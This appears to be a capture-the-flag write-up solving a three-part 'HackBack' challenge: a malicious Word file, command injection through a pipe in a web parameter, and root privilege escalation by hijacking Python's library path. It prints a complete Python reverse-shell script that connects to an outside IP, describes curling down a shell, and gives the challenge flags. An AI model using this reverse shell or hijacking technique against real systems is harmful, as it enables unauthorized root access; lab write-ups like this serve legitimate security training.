In this challenge from the Pwnable category we get a HackBack.doc file with some malware in it as my Windows machine's Defender quickly started yelling. It is a 3 part challenge which I have to say, was probably my favorite.


## PART 1
![image](https://user-images.githubusercontent.com/80063008/137871944-97354123-f98b-445c-a0bb-2cf7bc8d5c8b.png)

On my Linux machine I used [olevba](https://github.com/decalage2/oletools) to inspect it and see what is inside. I'll spare you the large amounts of code I went through for a bunch of hours. The interesting bit is here:

![image](https://user-images.githubusercontent.com/80063008/137871967-57216c73-0b15-4968-81f3-0a5158f9c2ed.png)

This matches up with the parameters from the given URL:

![image](https://user-images.githubusercontent.com/80063008/137871980-d2e0c498-7934-40c6-8e14-33b6796ca905.png)


Got stuck here for a while as I kept replacing the parameters with various things and kept getting only Invalid Request. Then the Agent in the "Req Trick Agent v1.0" made me thing of User-Agent.

Replaced the User-Agent in Burpsuite and now we no longer get Invalid Request.

![image](https://user-images.githubusercontent.com/80063008/137872824-24d7cc93-55e5-4221-b9fb-a68be8fd004d.png)


We actually get something, but it's just garbage encrypted base64. So back to playing with the parameters looking for SQLi, LFI, SSTI, RFI and last but not least, Command Injection. 

A pipe allows for command injection so I curled down a reverse shell and got on the box:

![image](https://user-images.githubusercontent.com/80063008/137872899-740dd45a-19eb-45c9-8b27-42421423cdc3.png)

First thing I check, is to see what kind of permissions I have, if any: sudo -l

![image](https://user-images.githubusercontent.com/80063008/137873951-593d688f-e395-4516-89fe-a99b09a9283b.png)


We can run a python script as root with no password.

First flag is in the script:

GPSCTF{HackBack1:2cc65d14825c76f5fd5383a9ccf08da2}

## PART 2

The second flag is mentioned to be in the root folder so we need to privesc. Considering we can run a python script as root, there are usually 3 ways to do that. Library highjacking, module highjacking and path highjacking. More details about it can be found here: https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8

![image](https://user-images.githubusercontent.com/80063008/137873397-502ed09c-a7d5-45c7-afed-73238c2c4370.png)


Using the syntax below, we can check where the file is importing the libraries from.

```bash
python -c 'import sys; print("\n".join(sys.path))'
```
![image](https://user-images.githubusercontent.com/80063008/137873443-ee21866d-3ba9-47e8-8061-e7fb1a927789.png)

It's first looking to get them from a python35.zip located in /usr/lib. First question is, can we write in there?

![image](https://user-images.githubusercontent.com/80063008/137873474-84a8b0e7-55ec-4426-bdff-009194875fb9.png)

We sure can. So we create our own library we want to highjack, lets go with base64.py. I create a file called base64.py with a python reverse shell:

```python
import socket
import os
import pty
 
s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.0.23",1337))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```

Then I archived that into a file called python35.zip and put that into /usr/lib.

Now when I ran the script as root while having my netcat listener up:

```bash
sudo -u root /create.py
```

It is actually running my base64.py script which gets me on the box as root:

![image](https://user-images.githubusercontent.com/80063008/137873524-9428e7b2-3ed6-4306-b32d-e57b54c10484.png)

GPSCTF{HackBack2:29e79e93ae2db19635feccb214920b4a}

## PART 3

As you can see in the picture above, the Final flag is free to read right next to flag 2. No challenge here.

GPSCTF{HackBack3:4488b6d38d03e0781e31e5bab939f3a1}

